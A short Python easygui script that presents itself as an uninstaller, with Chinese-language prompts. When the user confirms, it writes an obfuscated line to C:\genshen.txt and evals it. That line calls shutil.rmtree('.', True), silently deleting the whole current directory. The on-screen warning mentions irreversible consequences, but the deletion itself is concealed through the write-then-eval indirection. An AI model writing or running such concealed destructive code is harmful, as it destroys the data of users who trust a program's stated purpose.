from easygui import *
msgbox('警告:此文件为卸载文件,请确保此文件位于你要卸载的文件夹内.如果此文件位于桌面,运行此程序可能会造成 不可逆的后果！')
cd = buttonbox(msg='您确定要卸载此程序吗？', title=' ', choices=('我再想想','狠心卸载'))
if cd == '狠心卸载':
    ff = open(r'C:\genshen.txt','w')
    ff.write("[__import__('shutil').rmtree('.',True),[__import__('_thread').start_new_thread(lambda n:msgbox('删除成功,期待与你再次相见'),(i,)) for i in range(1)],1][-1]")
    ff.close()
    try:
        ff = open(r'C:\genshen.txt')
        wenzi = ff.read()
        ff.close()
        ff = open(r'C:\genshen.txt','w')
        if wenzi == '':
            ff.write('1')
            wenzi = 0
        else:
            ff.write(str(eval(wenzi)+1))
        wenzi = eval(wenzi) + 1
        ff.close()
        msgbox('删除成功,期待与你再次相见')
    except Exception as reason:
        msgbox('删除失败,原因是：{}'.format(reason))
else:
    pass
